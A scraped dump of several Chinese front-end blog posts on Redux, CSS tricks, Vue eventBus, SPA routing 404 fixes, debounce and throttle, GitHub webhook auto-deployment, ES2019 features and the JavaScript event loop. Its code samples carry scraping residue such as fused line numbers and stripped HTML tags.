getState()方法获取 state； • 提供 dispatch(action)方法更新 state； • 通过 subscribe(listener)注册监听器; • 通过 subscribe(listener)返回的函数注销监听器。 根据已有的 Reducer 来创建 Store 是一件非常容易的事情，例如 Redux 提供的 createStore 函数可以很方便的创建一个新的 Store。 12345import { createStore } from 'redux'import todoApp from './reducers'// 使用createStore函数创建Storelet store = createStore(todoApp) 其中，createStore 函数的第二个参数是可选的，该参数用于设置 state 的初始状态。而这对于开发同构应用时非常有用的，可以让服务器端 redux 应用的 state 与客户端的 state 保持一致，并用于本地数据初始化。 let store = createStore(todoApp, window.STATE_FROM_SERVER) Store 对象包含所有数据，如果想得到某个时刻的数据，则需要利用 state 来获取。例如： 12345import { createStore } from 'redux';const store = createStore(fn);//利用store.getState()获取stateconst state = store.getState(); Redux 规定，一个 state 只能对应一个 view，只要 state 相同得到的 view 就相同，这也是 Redux 框架的重要特性之一。 到此，关于 Redux 的运作流程就非常的清晰了，下面总结下 Redux 的运作流程。 当用户触摸界面时，调用 store.dispatch(action)捕捉具体的 action 动作。 然后 Redux 的 store 自动调用 reducer 函数，store 传递两个参数给 reducer 函数：当前 state 和收到的 action。其中，reducer 函数必须是一个纯函数，该函数会返回一个新的 state。 根 reducer 会把多个子 reducer 的返回结果合并成最终的应用状态，在这一过程中，可以使用 Redux 提供的 combineReducers 方法。使用 combineReducers 方法时，action 会传递给每个子的 reducer 进行处理，在子 reducer 处理后会将结果返回给根 reducer 合并成最终的应用状态。 store 调用 store.subscribe(listener)监听 state 的变化，state 一旦发生改变就会触发 store 的更新，最终 view 会根据 store 数据的更新刷新界面。 Redux 实现1，创建 storestore 就是 redux 的一个数据中心，简单的理解就是我们所有的数据都会存放在里面，然后在界面上使用时，从中取出对应的数据。因此首先我们要创建一个这样的 store，可以通过 redux 提供的 createStore 方法来创建。 12345678910export default function createStore(reducer, preloadedState, enhancer) { ... return { dispatch, subscribe, getState, replaceReducer, [$$observable]: observable }} 可以看到 createStore 有三个参数，返回一个对象，里面有我们常用的方法，下面一一来看一下。 getStategetState 用于获取当前的状态，格式如下： 123function getState() { return currentState } Redux 内部通过 currentState 变量保存当前 store，变量初始值即我们调用时传进来的 preloadedState，getState()就是返回这个变量。 subscribe代码本身也不难，就是通过 nextListeners 数组保存所有的回调函数，外部调用 subscribe 时，会将传入的 listener 插入到 nextListeners 数组中，并返回 unsubscribe 函数，通过此函数可以删除 nextListeners 中对应的回调。以下是该函数的具体实现： 12345678910111213141516171819202122232425262728293031var currentListeners = [];var nextListeners = currentListeners;function ensureCanMutateNextListeners() { if (nextListeners === currentListeners) { nextListeners = currentListeners.slice(); //生成一个新的数组 }}function subscribe(listener) { if (typeof listener !== \"function\") { throw new Error(\"Expected listener to be a function.\"); } var isSubscribed = true; ensureCanMutateNextListeners(); nextListeners.push(listener); return function unsubscribe() { if (!isSubscribed) { return; } isSubscribed = false; ensureCanMutateNextListeners(); var index = nextListeners.indexOf(listener); nextListeners.splice(index, 1); };} 可以发现，上面的源码使用 currentListeners 和 nextListeners 两个数组来保存，主要原因是在 dispatch 函数中会遍历 nextListeners，这时候可能会客户可能会继续调用 subscribe 插入 listener，为了保证遍历时 nextListeners 不变化，需要一个临时的数组保存。 dispatch当 view dispatch 一个 action 后，就会调用此 action 对应的 reducer，下面是它的源码： 12345678910111213141516function dispatch(action) { ... try { isDispatching = true currentState = currentReducer(currentState, action) //调用reducer处理 } finally { isDispatching = false } var listeners = currentListeners = nextListeners for (var i = 0; i < listeners.length; i++) { var listener = listeners[i] listener() } ...} 从上面的源码可以发现，dispatch 函数在调用了 currentReducer 以后，遍历 nextListeners 数组，回调所有通过 subscribe 注册的函数，这样在每次 store 数据更新，组件就能立即获取到最新的数据。 replaceReducerreplaceReducer 是切换当前的 reducer，虽然代码只有几行，但是在用到时功能非常强大，它能够实现代码热更新的功能，即在代码中根据不同的情况，对同一 action 调用不同的 reducer，从而得到不同的数据。 12345678function replaceReducer(nextReducer) { if (typeof nextReducer !== \"function\") { throw new Error(\"Expected the nextReducer to be a function.\"); } currentReducer = nextReducer; dispatch({ type: ActionTypes.REPLACE });} bindActionCreatorsbindActionCreators 方法的目的就是简化 action 的分发，我们在触发一个 action 时，最基本的调用是 dispatch(action(param))。这样需要在每个调用的地方都写 dispatch，非常麻烦。bindActionCreators 就是将 action 封装了一层，返回一个封装过的对象，此后我们要出发 action 时直接调用 action(param)就可以了。 react-reduxredux 作为一个通用的状态管理库，它不只针对 react，还可以作用于其它的像 vue 等。因此 react 要想完美的应用 redux，还需要封装一层，react-redux 就是此作用。react-redux 库相对简单些，它提供了一个 react 组件 Provider 和一个方法 connect。下面是 react-redux 最简单的写法： 12345678910import { Provider } from 'react-redux'; // 引入 react-redux...render( , document.getElementById('app'),); connect 方法复杂点，它返回一个函数，此函数的功能是创建一个 connect 组件包在 WrappedComponent 组件外面，connect 组件复制了 WrappedComponent 组件的所有属性，并通过 redux 的 subscribe 方法注册监听，当 store 数据变化后，connect 就会更新 state，然后通过 mapStateToProps 方法选取需要的 state，如果此部分 state 更新了，connect 的 render 方法就会返回新的组件。 1234567export default function connect(mapStateToProps, mapDispatchToProps, mergeProps, options = {}) { ... return function wrapWithConnect(WrappedComponent) { ... }} 最后【转自掘金】","link":"/posts/f4eb40ab/"},{"title":"网易云音乐歌词直链","text":"音乐这里需要用到网易云音乐提供的直链 api 1https://music.163.com/song/media/outer/url?id=xxx.mp3 这里的 id=xxx.mp3 是根据你需要的歌曲的 ID 进行更改。 例如：歌曲：演员-薛之谦 1https://music.163.com/#/song?id=32507038 修改为： 1https://music.163.com/song/media/outer/url?id=32507038.mp3 DEMO 演示 歌词 官方接口 1http://music.163.com/api/song/media?id=xxx 这里的 id=xxx 是根据你需要的歌曲的 ID 进行更改。 但是 我们只需要 lyric 字段,配合aplayer想直接出来歌词 这里只能自己写接口了 我的歌词接口 1https://api.chenyeah.com/wyylyric?id=xxx 总结以歌曲 2 Days为例 网页： https://music.163.com/#/song?id=517918738 音乐： https://music.163.com/song/media/outer/url?id=517918738.mp3 歌词： https://api.chenyeah.com/wyylyric?id=517918738","link":"/posts/fec2250c/"},{"title":"CSS小技巧小汇","text":"一、flex 项中子元素文本截断 text-overflow:ellipsis 失效,给你一个完美的解决方案。flexbox 布局时 flex 项子元素中的文本溢出后想显示省略号(…)，结果设置 text-overflow:ellipsis 后没效果，我们来看代码：HTML 代码： 123456789 图标 flexbox 布局旨在提供一个更有效地布局、对齐方式，并且能够使容器中的子元素大小未知或动态变化情况下仍然能够分配好子元素之间的空间。 CSS 代码： 1234567891011121314.flex { display: flex;}.flex .col1 { margin-right: 6px;}.flex .col2 { flex: 1;}.flex .col2 .item-con { text-overflow: ellipsis; overflow: hidden; white-space: nowrap;} 完整的 DEMO ： 我们看到 .col2 设置 flex: 1; , .item-con 设置了 text-overflow:ellipsis ，但是文本还是溢出了。 这种布局在移动端页面开发时候经常遇到，我们不能为 .item-con 元素设置个宽度，这样就无法适应不同屏幕尺寸的终端设备。 解决方案：在 flex项中设置 min-width: 0;解决方案是在 flex 项（上例子中 .col2 元素）中设置 min-width: 0;，当然你也可以设置其他合适的 min-width值。 ## 二、css 文本多行显示，超出省略号表示 123456789.text { width: 200px; word-break: break-all; text-overflow: ellipsis; display: -webkit-box; /** 对象作为伸缩盒子模型显示 **/ -webkit-box-orient: vertical; /** 设置或检索伸缩盒对象的子元素的排列方式 **/ -webkit-line-clamp: 3; /** 显示的行数 **/ overflow: hidden; /** 隐藏超出的内容 **/ } 三、进度条动画123456789101112131415161718192021222324 .process { width: 200px; height: 20px; border-radius: 10px; background: repeating-linear-gradient( -45deg, #fafafa 25%, #f93e3e 0, #f93e3e 50%, #fafafa 0, #fafafa 75%, #f93e3e 0 ); background-size: 15px 15px; animation: panoramic 8s linear infinite; } @keyframes panoramic { to { background-position: 200%; } } .process{ width:200px; height:20px; border-radius:10px; background: repeating-linear-gradient(-45deg, #fafafa 25%, #f93e3e 0, #f93e3e 50%, #fafafa 0, #FAFAFA 75%, #f93e3e 0); background-size: 15px 15px; animation: panoramic 8s linear infinite; } @keyframes panoramic { to { background-position: 200%; } }","link":"/posts/65e9dcbb/"},{"title":"Vue中的eventBus使用","text":"使用 eventBus在项目入口文件main.js中 加入如下代码 12// EventBuswindow.eventBus = new Vue(); 这是引入全局变量eventBus 准备两个需要通信的 vue 组件 About.vue 123456789101112131415161718192021 This is an {{msg}} page other :{{other}} export default { data() { return { msg: \"about\", other: \"old other\" }; }, created() { eventBus.$on(\"postData\", data => { this.other = data; }); }}; 代码中 data 里的 other 值一开始是 old other,这个组件需要另一个组件返回过来的值来进行更新。如下代码则是取回 键值是postData 的数据 123eventBus.$on(\"postData\", data => { this.other = data;}); Test.vue 123456789101112131415161718 This is an {{msg}} page export default { data() { return { msg: \"test\" }; }, methods: {}, destroyed() { eventBus.$emit(\"postData\", \"new other\"); }}; 以下代码是在组件销毁之前给键值postData 注入值 new other 1eventBus.$emit(\"postData\", \"new other\"); 效果所以效果就是一开始进入 about 页面时 other 值为 old other进入 test 页面 再返回时 other 值则变成了 new other","link":"/posts/cd22a207/"},{"title":"BrowserHistory刷新页面404问题","text":"使用 React 开发新项目时，遇见了刷新页面，直接访问二级或三级路由时，访问失败，出现 404 或资源加载异常的情况，本篇针对此问题进行分析并总结解决方案。 发现问题使用webpack-dev-server做本地开发服务器时，正常情况只需要简单使用webpack-dev-server指令启动即可，但是当项目处于以下两种情况时，往往需要有嵌套路由和异步加载路由： 我们使用 react-router 这种路由库构建单页面应用路由； 使用 html-webpack-plugin 插件动态将加载 js 的script标签注入 html 文档； 这时，访问首页是可以正常加载页面和 js 等文件的，但是当我们需要访问二级甚至三级路由或者刷新页面时，如/page1时，可能会出现两种情况： 页面加载失败，返回 Cannot Get（404）； 服务响应，但是没有返回 webpack 处理输出的 html 文件，导致无法加载 js 资源; 分析解决问题发现问题后，我们就要开始分析，我们判断这个问题一般是两方面原因造成： react-router路前端由配置； webpack-dev-server服务配置； 发现文档中提到了使用browserHistory时，会创建真实的URL，处理初始/请求没有问题，但是对于跳转路由后，刷新页面或者直接访问该 URL 时，会发现无法正确相应.一下是几种服务器配置解决方式： node 12345678910111213141516const express = require('express')const path = require('path')const port = process.env.PORT || 8080const app = express()// 通常用于加载静态资源app.use(express.static(__dirname + '/public'))// 在你应用 JavaScript 文件中包含了一个 script 标签// 的 index.html 中处理任何一个 routeapp.get('*', function (request, response){ response.sendFile(path.resolve(__dirname, 'public', 'index.html'))})app.listen(port)console.log(\\\"server started on port \\\" + port); Nginx 123456server { ... location / { try_files $uri /index.html }} Apache 12345RewriteBase /RewriteRule ^index\\\\.html$ - [L]RewriteCond %{REQUEST_FILENAME} !-fRewriteCond %{REQUEST_FILENAME} !-dRewriteRule . /index.html [L] 以下都是针对服务器的配置，本地调试，只是使用了webpack-dev-server的内置服务，但是我们已经找到问题所在了，就是路由请求无法匹配返回 html 文档，所以接下来就该去webpack-dev-server文档查找解决方式了. 这里也分两种情况： 没有修改 output.publicPath，即 webpack 配置文件中没有声明值，属于默认情况； 设置了 output.publicPath 为自定义值； webpack 如下配置： 123456module.exports = { //... devServer: { historyApiFallback: true }};","link":"/posts/bd4556bf/"},{"title":"JS的防抖与节流","text":"12345678910111213141516171819202122 demo body{ height:3000px; } function fn(){ console.log(\"invoke fn function\"); }; document.body.onscroll = fn; 我们打开浏览器，然后打开控制台，滚动鼠标的时候，控制台频繁的打印“invoke fn function”。我们这里为了显示，所以没有涉及到相关dom操作，但是实际开发过程中，更多场景是操作dom，那么将会使你的浏览器瞬间卡卡的感觉，有没有法子来限制一下fn的调用频率呢，答案是可以的，对此，我们将上面的代码改变如下： 12345678910111213141516171819202122232425262728293031323334353637 demo body{ height:3000px; } function fn(){ console.log(\"invoke fn function\"); }; document.body.onscroll = avoidShak(fn,300); // 限制调用频率 function avoidShak(fn,time){ //设置定时器 let timer; return function(...args){ //清空上一次的定时器 clearTimeout(timer); //获取执行环境的上下文 let context = this; let _arguments = args; timer = setTimeout(()=>{ fn.apply(context,_arguments); },time); }; }; 我们现在发现打开浏览器，滚动的时候不会那么频繁的调用fn函数了，只有当我们滚动的间隙稍微停顿300毫秒的时候才会调用一次，这样我们就做到了降低函数调用的频率了。 它的原理其实很简单：1 用闭包实现一个timer变量，用来保存上一次调用函数的定时器id;2 我们不是直接调用函数，而是中间需要一个间隔，如果两次调用之间的时间差小于我们传递的值，那么清空上一次的调用值；3 我们每一次调用的时候都清除一下上一次的调用定时器id，这样就保证了，如果间隔时间小于我们设置的值，那么上一次函数一定不会调用，从而达到了降低调用频率的效果。 上面这种通过设置定时器保证一段时间内事件回调函数只能执行一次的做法在javascript业界有一个专业的术语称谓——防抖！ 上面的防抖操作，我们发现减少了回调函数调用的频率，但是它有一点点瑕疵：如果我们一直触发事件，回调函数只会在我们停止触发事件并达到了设置的时间间隔之后才会调用一次，也就是说在我们触发事件的过程中，回调函数一直没有执行，这在某些情况下，会跟实际业务需求不符。实际业务需求可能是，1 减少触发频率；2 但不能中间很大一段时间一直不执行。ok，那么此时我们就需要通过函数节流来实现！ 把下面的代码在浏览器中打开，并水平缩放浏览器，看效果： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354 demo *{ margin:0px; padding:0px; vertical-align:baseline; -webkit-box-sizing:border-box; -moz-box-sizing:border-box; box-sizing:border-box; } .box{ width:1000px; height: 500px; background-color:#ccc; color:#fff; font-size:20px; padding:15px 20px; text-align:left; } i am a div box,please resize the browser horizontally! let dom = document.getElementById('box'); function setWidth(){ let windowWidth = window.innerWidth; if(windowWidth>=1000)return; dom.style.width = windowWidth + 'px'; }; //采用防抖实现限制回调函数调用频率 function avoidShak(fn,time){ let timer; return function(...args){ clearTimeout(timer); let context = this; let _arguments = args; timer = setTimeout(()=>{ fn.apply(context,_arguments); },time); }; }; window.onresize = avoidShak(setWidth,300); 先来说下上面的页面需求：打开页面，在浏览器水平缩放的过程中，如果浏览器宽度不小于1000，那么不做任何事，否则设置dom的宽度为当前浏览器的宽度。 但是我们发现，我们在缩放的过程中，dom的尺寸并未做相应的更新，只有在停止缩放一段时间后，dom的宽度才更新到浏览器的宽度，这跟业务需求不符，于是我们代码改变如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556 demo *{ margin:0px; padding:0px; vertical-align:baseline; -webkit-box-sizing:border-box; -moz-box-sizing:border-box; box-sizing:border-box; } .box{ width:1000px; height: 500px; background-color:#ccc; color:#fff; font-size:20px; padding:15px 20px; text-align:left; } i am a div box,please resize the browser horizontally! let dom = document.getElementById('box'); function setWidth(){ let windowWidth = window.innerWidth; if(windowWidth>=1000)return; dom.style.width = windowWidth + 'px'; }; //采用节流实现限制回调函数调用频率 function ttrottle(fn,time){ let isNeedInvoke = true; return function(...args){ if(!isNeedInvoke)return; let context = this; let _arguments = args; isNeedInvoke = false; setTimeout(()=>{ fn.apply(context,_arguments); isNeedInvoke = true; },time); }; }; window.onresize = ttrottle(setWidth,300); 我们发现经过这样改过之后，dom的宽度变成在我们缩放的过程中也会更新了，满足了我们业务需求。 好了，我们来简单介绍下什么是节流！ 节流其实从名字上就知道它的含义——就是限制函数调用频率。 主要有两种方式实现： 法一：时间差，原理无非就是两次调用之间的时间差小于设置时，那么不调用，反之调用。代码如下： 1234567891011121314function ttrottle(fn,time){ //上一次调用时间 let lastInvokeTime = new Date().getTime(); //当前调用时间 let currentInvokeTime; return function(...args){ currentInvokeTime = new Date().getTime(); if(currentInvokeTime - lastInvokeTime { fn.apply(context,_arguments); isNeedInvoke = true; },time); };}; ok，到这里大家应该知道节流的是干嘛以及原理了吧。 最后，再来总结一下防抖和节流的区别： 防抖和节流的相同点就是限制回调函数调用频率； 防抖在一段时间内，回调函数只会调用一次，即触发事件的最后一次； 节流在一段时间内，会每隔一段时间调用一次； 下面是具体函数 这只是简单的实现方法 函数防抖函数防抖（debounce）：当持续触发事件时，一定时间段内没有再触发事件，事件处理函数才会执行一次，如果设定的时间到来之前，又一次触发了事件，就重新开始延时。 如下，持续触发scroll事件时，并不执行handle函数，当1000毫秒内没有触发scroll事件时，才会延时触发scroll事件 12345678910111213function debounce(fn, wait) { var timeout = null; return function() { if(timeout !== null) clearTimeout(timeout); timeout = setTimeout(fn, wait); }}// 处理函数function handle() { console.log(Math.random());}// 滚动事件window.addEventListener('scroll', debounce(handle, 1000)); 函数节流函数节流（throttle）：当持续触发事件时，保证一定时间段内只调用一次事件处理函数。 节流通俗解释就比如我们水龙头放水，阀门一打开，水哗哗的往下流，秉着勤俭节约的优良传统美德，我们要把水龙头关小点，最好是如我们心意按照一定规律在某个时间间隔内一滴一滴的往下滴。 如下，持续触发scroll事件时，并不立即执行handle函数，每隔1000毫秒才会执行一次handle函数。 12345678910111213141516var throttle = function(func, delay) { var prev = Date.now(); return function() { var context = this; var args = arguments; var now = Date.now(); if (now - prev >= delay) { func.apply(context, args); prev = Date.now(); } } } function handle() { console.log(Math.random()); } window.addEventListener('scroll', throttle(handle, 1000)); 总结函数防抖将几次操作合并为一此操作进行。原理是维护一个计时器，规定在delay时间后触发函数，但是在delay时间内再次触发的话，就会取消之前的计时器而重新设置。这样一来，只有最后一次操作能被触发。 函数节流使得一定时间内只触发一次函数。原理是通过判断是否到达一定时间来触发函数。 区别函数节流不管事件触发有多频繁，都会保证在规定时间内一定会执行一次真正的事件处理函数，而函数防抖只是在最后一次事件后才触发一次函数。比如在页面的无限加载场景下，我们需要用户在滚动页面时，每隔一段时间发一次 Ajax 请求，而不是在用户停下滚动页面操作时才去请求数据。这样的场景，就适合用节流技术来实现。","link":"/posts/e84b650a/"},{"title":"webhook初次体验尝试","text":"使用 webhook,每次在您的存储库上发生事件时，无论是推送代码，填写问题还是创建拉取请求，您注册的 webhook 地址都可以配置为包含详细信息。这样可以监听代码的任何变动 这次使用它进行代码自动部署及其他处理 先决条件 服务器 node.js 环境 pm2 以上安装教程自行搜索 github-webhook-handlergithub-webhook-handler 这个库是Node.js Web 服务器的小型处理程序（或者说是“中间件”），它处理接收和验证来自 GitHub 的 webhook 请求的所有逻辑。 例子：app.js 12345678910111213141516171819202122232425262728293031323334var http = require(\"http\");var createHandler = require(\"github-webhook-handler\");var handler = createHandler({ path: \"/webhook\", secret: \"myhashsecret\" });http .createServer(function(req, res) { handler(req, res, function(err) { res.statusCode = 404; res.end(\"no such location\"); }); }) .listen(7777);handler.on(\"error\", function(err) { console.error(\"Error:\", err.message);});handler.on(\"push\", function(event) { console.log( \"Received a push event for %s to %s\", event.payload.repository.name, event.payload.ref );});handler.on(\"issues\", function(event) { console.log( \"Received an issue event for %s action=%s: #%d %s\", event.payload.repository.name, event.payload.action, event.payload.issue.number, event.payload.issue.title );}); 其中 createHandler中的参数如下 “path”：req.url查看传入请求时要匹配的完整区分大小写的路径/路由。任何不匹配此路径的请求都将导致调用处理程序的回调函数（有时称为 next 处理程序）。 “secret”：这是一个哈希键，用于创建 GitHub 发送的 JSON blob 的 SHA-1 HMAC 签名。您应该使用 GitHub 注册相同的密钥。任何未提供X-Hub-Signature与使用此密钥针对 blob 生成的签名匹配的请求将被拒绝并导致’error’事件（也将使用 Error 对象调用回调）。 “events”：可选的列入白名单的事件类型数组（请参阅：events.json）。如果已定义，X-Github-Event则将拒绝在白名单中找不到的任何传入请求。如果只接受单个事件类型，则此选项也可以是字符串。 代码部署运行 shell 脚本代码我们要监听代码变化 同时运行 shell代码 例：build.sh如下 1234#! /bin/bashcd /www/wwwroot/projectgit fetch --allgit reset --hard origin/master 运行脚本方式调用子进程进行脚本调用 介绍一下两种 spawn1234var spawn = require(\"child_process\").spawn;spawn(\"sh\", [\"./build.sh\"], { stdio: \"inherit\"}); execSync12var exec = require(\"child_process\").execSync;exec(\"bash ./build.sh\", { stdio: \"inherit\" }); 我们现在使用第一种 修改 app.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152var http = require(\"http\");var createHandler = require(\"github-webhook-handler\");var handler = createHandler({ path: \"/webhook\", secret: \"myhashsecret\" });const spawn = require(\"child_process\").spawn;const runCommand = (cmd, args, callback) => { const child = spawn(cmd, args); let response = \"\"; child.stdout.on(\"data\", buffer => (response += buffer.toString())); child.stderr.on(\"data\", buffer => (response += buffer.toString())); child.on(\"close\", code => { console.log(`子进程退出码：${code}`); if (code === 0) { callback(response); } });};http .createServer(function(req, res) { handler(req, res, function(err) { res.statusCode = 404; res.end(\"no such location\"); }); }) .listen(7777);handler.on(\"error\", function(err) { console.error(\"Error:\", err.message);});handler.on(\"push\", function(event) { console.log( \"Received a push event for %s to %s\", event.payload.repository.name, event.payload.ref ); //运行 build.sh runCommand(\"sh\", [\"./build.sh\"], txt => { console.log(txt); });});handler.on(\"issues\", function(event) { console.log( \"Received an issue event for %s action=%s: #%d %s\", event.payload.repository.name, event.payload.action, event.payload.issue.number, event.payload.issue.title );}); 这样每次 push 代码时都会运行 build.sh 实际运行测试可以 先 node app.js 浏览器打开 IP:7777 是否可以打开，打开说明服务启用成功 实际需要pm2常驻后台 运行 pm2 start --name \"webhook\" app.js webhook 其他操作部署好的同时 因为我的静态文件进行了 CDN ，每次部署需要等待一段时间才能生效。所以 我部署的同时 进行 CDN URL 刷新修改代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475var http = require(\"http\");var createHandler = require(\"github-webhook-handler\");var handler = createHandler({ path: \"/webhook\", secret: \"chenyeah.com\" });const spawn = require(\"child_process\").spawn;// 腾讯cdn刷新数据const qcloudSDK = require(\"qcloud-cdn-node-sdk\");qcloudSDK.config({ secretId: \"\", secretKey: \"\"});const refreshCdnUrl = () => { qcloudSDK.request( \"RefreshCdnUrl\", { \"urls.0\": \"https://yoaio.com\", \"urls.1\": \"https://yoaio.com/js/main.js\", \"urls.2\": \"https://yoaio.com/css/style.cssi\", \"urls.3\": \"https://yoaio.com/sitemap.xml\" }, res => { console.log(res.toString()); } );};const runCommand = (cmd, args, callback) => { const child = spawn(cmd, args); let response = \"\"; child.stdout.on(\"data\", buffer => (response += buffer.toString())); child.stderr.on(\"data\", buffer => (response += buffer.toString())); child.on(\"close\", code => { console.log(`子进程退出码：${code}`); if (code === 0) { callback(response); } });};http .createServer(function(req, res) { handler(req, res, function(err) { res.statusCode = 404; res.end(\"no such location\"); }); }) .listen(7777);handler.on(\"error\", function(err) { console.error(\"Error:\", err.message);});handler.on(\"push\", function(event) { console.log( \"Received a push event for %s to %s\", event.payload.repository.name, event.payload.ref ); if (event.payload.ref === \"refs/heads/master\") { runCommand(\"sh\", [\"./build.sh\"], txt => { console.log(txt); refreshCdnUrl(); }); }});handler.on(\"issues\", function(event) { console.log( \"Received an issue event for %s action=%s: #%d %s\", event.payload.repository.name, event.payload.action, event.payload.issue.number, event.payload.issue.title );}); 这样每次部署 自动刷新 CDN URL 刷新 最后此篇文章就是稍微使用一下webhook","link":"/posts/48bbcb52/"},{"title":"Javascript ES2019中的8个新特性","text":"前言JavaScript 不断改进和添加更多功能。TC39 已经完成并批准了 ES2019 的这 8 个功能，它有 4 个阶段，这些阶段是： Stage 0: Strawman Stage 1: Proposals Stage 2: Drafts Stage 3: Candidates Stage 4: Finished/Approved 以下链接可以查看Stage 0，Stage 1 – 3 和Final Stage 可选的 Catch 绑定能够在不使用 catch 绑定的地方选择性地删除它 123456try { // trying to use a new ES2019 feature // which may not be implemented in other browsers} catch (unused) { // revert back to old way} 现在可以删除未使用的绑定 12345try { ...} catch { ...} JSON 超集此提议的动机是 JSON 字符串可以包含未转义的 U + 2028 LINE SEPARATOR 和 U + 2029 PARAGRAPH SEPARATOR 字符，而 ECMAScript 字符串则不能。在 ES2019 之前，它会产生错误SyntaxError: Invalid or unexpected token 12const LS = eval('\"\\u2028\"');const PS = eval(\"'\\u2029'\"); 符号说明在 ES2015 中引入符号，具有非常独特的功能。在 ES2019 中，它现在可以提供给定的描述。其目的是避免间接获得所提供的描述Symbol.prototype.toString 1234567const mySymbol = Symbol(\"myDescription\");console.log(mySymbol); // Symbol(myDescription)console.log(mySymbol.toString()); // Symbol(myDescription)console.log(mySymbol.description); // myDescription Function.prototype.toString - 修订版我们之前已经在函数原型中使用了toString方法，但是在 ES2019 中它已被修改并包含函数内的注释，请注意它在Arrow Functions上不起作用。 123456789101112function /* comment */ foo /* another comment */() {}// Beforeconsole.log(foo.toString()); // function foo(){}// Now ES2019console.log(foo.toString()); // function /* comment */ foo /* another comment */ (){}// Arrow Syntaxconst bar /* comment */ = /* another comment */ () => {};console.log(bar.toString()); // () => {} Object.fromEntries它是 Object.entries 的反向方法，它也是克隆对象的方法之一 1234567891011121314const obj = { prop1: 1, prop2: 2};const entries = Object.entries(obj);console.log(entries); // [ [ 'prop1', 1 ], [ 'prop2', 2 ] ]const fromEntries = Object.fromEntries(entries);console.log(fromEntries); // Object { prop1: 1, prop2: 2 }console.log(obj === fromEntries); // false 注意：任何嵌入式对象/数组都只是通过引用复制。 格式良好的 JSON.stringify这也是由同一个人提出的，并且与 JSON 超集特征有关 。ES2019 不是将未配对的代理代码点作为单个 UTF-16 代码单元返回，而是用 JSON 转义序列表示它们 12345// Beforeconsole.log(JSON.stringify(\"\\uD800\")); // \"�\"// Now ES2019console.log(JSON.stringify(\"\\uD800\")); // \"\\ud800\" String.prototype trimStart 和 trimEnd我们已经在 String 原型中使用了trim方法，它删除了字符串开头和结尾之间的空格。但是现在开始介绍 ES2019 的 trimStart和trimEnd 1234567891011// Trimconst name = \" Codedam \";console.log(name.trim()); // \"Codedam\"// Trim Startconst description = \" Unlocks Secret Codes \";console.log(description.trimStart()); // \"Unlocks Secret Codes \"// Trim Endconst category = \" JavaScript \";console.log(category.trimEnd()); // \" JavaScript\" Array.prototype flat 和 flatMapflat方法创建一个新数组，所有子数组元素以递归方式连接到指定的深度。 默认情况下，深度为 1，使数组上第一层嵌套数组变平。 12345678const arr = [1, 2, [3, 4, [5, 6]]];arr.flat(); // [1, 2, 3, 4, [5, 6]]arr.flat(2); // [1, 2, 3, 4, 5, 6]// You can use Infinity to flatten all the nested arrays no matter how deep the array isconst arrExtreme = [1, [2, [3, [4, [5, 6, 7, [8, 9]]]]]];arrExtreme.flat(Infinity); // [1, 2, 3, 4, 5, 6, 7, 8, 9] flatMap 类似于 flat 并且与 map 相关，其中它映射数组然后将其展平 1234567const arr = [\"Codedam\", \"is Awsome\", \"!\"];const mapResult = arr.map(item => item.split(\" \"));console.log(mapResult); // [ [ 'Codedam' ], [ 'is', 'Awsome' ], [ '!' ] ]const flatMapResult = arr.flatMap(chunk => chunk.split(\" \"));console.log(flatMapResult); // ['Codedam', 'is', 'Awsome', '!']; 其他 强调一下现在 Stage 3 中的一些有用的即将推出的功能。 globalThis BigInt import() Legacy RegEx Private instance methods and accessors String.prototype.matchAll 最后原文：8 NEW FEATURES in JavaScript ES2019作者：Rienz","link":"/posts/a77f99b9/"},{"title":"从一道题浅说 JavaScript 的事件循环","text":"任务队列首先我们需要明白以下几件事情： JS 分为同步任务和异步任务 同步任务都在主线程上执行，形成一个执行栈 主线程之外，事件触发线程管理着一个任务队列，只要异步任务有了运行结果，就在任务队列之中放置一个事件。 一旦执行栈中的所有同步任务执行完毕（此时 JS 引擎空闲），系统就会读取任务队列，将可运行的异步任务添加到可执行栈中，开始执行。 根据规范，事件循环是通过任务队列的机制来进行协调的。一个 Event Loop 中，可以有一个或者多个任务队列(task queue)，一个任务队列便是一系列有序任务(task)的集合；每个任务都有一个任务源(task source)，源自同一个任务源的 task 必须放到同一个任务队列，从不同源来的则被添加到不同队列。 setTimeout/Promise 等 API 便是任务源，而进入任务队列的是他们指定的具体执行任务。 宏任务(macro)task（又称之为宏任务），可以理解是每次执行栈执行的代码就是一个宏任务（包括每次从事件队列中获取一个事件回调并放到执行栈中执行）。 浏览器为了能够使得 JS 内部(macro)task 与 DOM 任务能够有序的执行，会在一个(macro)task 执行结束后，在下一个(macro)task 执行开始前，对页面进行重新渲染，流程如下： 1(macro)task->渲染->(macro)task->... (macro)task 主要包含：script(整体代码)、setTimeout、setInterval、I/O、UI 交互事件、postMessage、MessageChannel、setImmediate(Node.js 环境) 微任务microtask（又称为微任务），可以理解是在当前 task 执行结束后立即执行的任务。也就是说，在当前 task 任务后，下一个 task 之前，在渲染之前。 所以它的响应速度相比 setTimeout（setTimeout 是 task）会更快，因为无需等渲染。也就是说，在某一个 macrotask 执行完后，就会将在它执行期间产生的所有 microtask 都执行完毕（在渲染前）。 microtask 主要包含：Promise.then、MutaionObserver、process.nextTick(Node.js 环境) 运行机制在事件循环中，每进行一次循环操作称为 tick，每一次 tick 的任务处理模型是比较复杂的，但关键步骤如下： 执行一个宏任务（栈中没有就从事件队列中获取） 执行过程中如果遇到微任务，就将它添加到微任务的任务队列中 宏任务执行完毕后，立即执行当前微任务队列中的所有微任务（依次执行） 当前宏任务执行完毕，开始检查渲染，然后 GUI 线程接管渲染 渲染完毕后，JS 线程继续接管，开始下一个宏任务（从事件队列中获取） 流程图如下： Promise 和 async 中的立即执行我们知道 Promise 中的异步体现在then和catch中，所以写在 Promise 中的代码是被当做同步任务立即执行的。而在 async/await 中，在出现 await 出现之前，其中的代码也是立即执行的。那么出现了 await 时候发生了什么呢？ await 做了什么从字面意思上看 await 就是等待，await 等待的是一个表达式，这个表达式的返回值可以是一个 promise 对象也可以是其他值。 很多人以为 await 会一直等待之后的表达式执行完之后才会继续执行后面的代码，实际上 await 是一个让出线程的标志。await 后面的表达式会先执行一遍，将 await 后面的代码加入到 microtask 中，然后就会跳出整个 async 函数来执行后面的代码。 这里感谢@chenjigeng 的纠正： 由于因为 async await 本身就是 promise+generator 的语法糖。所以 await 后面的代码是 microtask。所以对于本题中的 12345async function async1() { 